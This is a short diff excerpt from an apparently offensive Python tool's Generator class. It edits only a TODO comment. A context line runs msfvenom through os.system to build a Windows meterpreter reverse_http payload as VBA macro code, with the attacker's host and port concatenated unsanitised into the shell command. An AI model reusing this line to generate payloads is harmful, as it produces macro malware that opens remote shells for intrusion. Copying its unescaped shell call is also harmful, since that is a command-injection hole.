@@ -8,7 +8,7 @@ class Generator():
 
 
 	def genShellcode(self, host, port, arch):
-		#TODO fix to us estring .format\
+		#TODO fix to use string .format, remove the filewrite
 		code = ''
 		if (arch  == "x86"):
 			os.system("msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_http LHOST="+host+" LPORT="+port+" -f vba > /tmp/metasploit 2> /dev/null")
